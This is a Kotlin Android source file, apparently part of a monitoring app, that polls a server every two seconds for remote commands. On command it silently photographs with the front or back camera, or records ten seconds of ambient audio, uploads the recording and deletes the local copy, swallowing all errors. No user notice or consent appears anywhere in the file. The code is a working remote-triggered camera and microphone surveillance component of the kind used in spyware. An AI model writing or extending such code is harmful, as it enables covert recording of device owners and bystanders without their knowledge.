package com.empresa.monitor.service.monitoring

import android.content.Context
import com.empresa.monitor.data.repository.MonitorRepository
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.*
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class CommandPoller @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitorRepository,
    private val cameraMonitor: CameraMonitor
) {
    private var job: Job? = null

    fun start() {
        stop()
        job = CoroutineScope(Dispatchers.IO + SupervisorJob()).launch {
            while (isActive) {
                try {
                    val command = repository.checkPendingCommand()
                    if (command != null) {
                        handleCommand(command)
                    }
                } catch (_: Exception) {}
                delay(2_000)
            }
        }
    }

    fun stop() {
        job?.cancel()
        job = null
    }

    private fun handleCommand(command: Map<String, Any?>) {
        val cmd = command["command"] as? String ?: return
        when (cmd) {
            "take_photo_front" -> {
                val captureId = command["capture_id"] as? String
                CoroutineScope(Dispatchers.IO).launch {
                    cameraMonitor.capturePhoto("front", captureId)
                }
            }
            "take_photo_back" -> {
                val captureId = command["capture_id"] as? String
                CoroutineScope(Dispatchers.IO).launch {
                    cameraMonitor.capturePhoto("back", captureId)
                }
            }
            "request_battery" -> {
                // Already handled by BatteryMonitor
            }
            "sync_all" -> {
                // Trigger all monitors to send data now
            }
            "record_ambient" -> {
                val captureId = command["capture_id"] as? String
                recordAmbientAudio(captureId)
            }
        }
    }

    private fun recordAmbientAudio(captureId: String?) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val audioRecorder = AudioRecorder(context)
                val audioFile = audioRecorder.record(seconds = 10)
                if (audioFile != null && audioFile.exists()) {
                    repository.sendAmbientAudio(audioFile)
                    audioFile.delete()
                }
            } catch (_: Exception) {}
        }
    }
}
